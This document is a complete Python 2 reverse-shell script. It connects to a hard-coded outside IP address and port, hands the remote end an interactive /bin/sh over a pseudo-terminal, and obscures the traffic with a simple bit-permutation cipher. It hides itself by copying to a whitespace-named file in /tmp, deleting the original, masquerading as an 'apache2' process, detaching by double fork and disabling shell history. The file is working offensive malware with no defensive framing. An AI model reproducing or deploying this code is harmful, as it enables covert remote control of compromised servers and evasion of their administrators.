#!/usr/bin/env python
import sys, socket, os
import pty, fcntl, struct, termios, select, resource

pybin = '/usr/bin/python'     ## path to python on server
name  = 'apache2 -d'          ## fake name for our process (can contain spaces & fake args)
host  = '95.181.93.72'        ## HOST to connect to
port  = 8888                  ## PORT to connect to
h, w  = 36, 111               ## terminal size == 111x36

def crypt( xxx, key = [ 7,6,5,4,3,2,1,0 ] ):
    def bin( n ):
        return ''.join( map( lambda y: str((n >> y) & 1), range( 7 , -1, -1 ) ) )

    def perm( c ):
        """ This function is remap one byte to another
            with bit-permutations.
            assert( perm^2 === 1 )
        """
        s = bin( ord( c ) )                                                        ## 3 --> 00000011
        return chr( int( ''.join([ s[ key[ i ] ] for i in xrange( 8 ) ]), 2 ) )    ## return chr( int( 11000000 ) )
    return ''.join( map( perm, xxx ) )


our_path = os.path.abspath( __file__ )                   ## path to this script
open( '/tmp/ ', 'w' ).write( open( our_path ).read() )   ## make copy to filename <<space>>
os.unlink( our_path )                                    ## first time it delete shell.py and second time <<space>> file

if len( sys.argv ) < 2:                                  ## is here special hidden arg <<space>> ?
    os.chdir( '/tmp' )                                   ## chdir to tmp to avoid '/tmp' part in process list
    os.execv( pybin, [ name, ' ', ' ' ] )                ## exec python /tmp/<<space>> <<space>>
    ## nothing is called after execv...

try:                                                     ## creating socket & connecting...
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    sock.connect( (host, port) )
    fsock = sock.fileno()
except:
    print "[!] Can't connect !\n"
    exit( 0 )

if os.fork() > 0: exit( 0 )                              ## forking for deattaching from main thread
if os.fork() > 0: exit( 0 )                              ## ...

os.dup2( fsock, sys.stdin.fileno()  )
os.dup2( fsock, sys.stdout.fileno() )
os.dup2( fsock, sys.stderr.fileno() )
sock.sendall(( crypt( '\r\n>>>>>>>>>>>>>>> rShell by ont.rif >>>>>>>>>>>>>>\r\n' ) ))

sys.stdout.write( "[!] %s\r\n" % sys.version )

pid, fpty = pty.fork()
if not pid: # Child
    try:
        TIOCSWINSZ = getattr(termios, 'TIOCSWINSZ', -2146929561)
        if TIOCSWINSZ == 2148037735L:
            TIOCSWINSZ = -2146929561
        s = struct.pack('HHHH', h, w, 0, 0)              ## setting terminal size
        fcntl.ioctl( sys.stdout.fileno(), TIOCSWINSZ, s )
    except:
        pass

    os.environ.update({ 'HISTFILE' : '',
                        'TERM'     : 'linux',
                        'HOME'     : '/tmp'    })        ## usefull env vars
    os.execv( '/bin/sh', [ name ] )                      ## bash with fake name


while True:
    r, w, e = select.select( [ fpty, fsock ], [], [], 5 )

    if fpty in r:
        try:
            dat = crypt( os.read( fpty, 100000 ) )       ## encrypt each char and compose new string...
            os.write( fsock, dat )
        except:
            print "[!] Die (child time out)......\r"
            os._exit( 0 )

    if fsock in r:
        dat = crypt( os.read( fsock, 1000 ) )            ## decrypt (use crypt again)
        os.write( fpty, dat )
        if not dat:
            print "[!] Die (empty socket)....\r"
            os._exit( 0 )

    os.write( fsock, crypt( '\x01' ) )                   ## magic byte (to avoid timeouts)
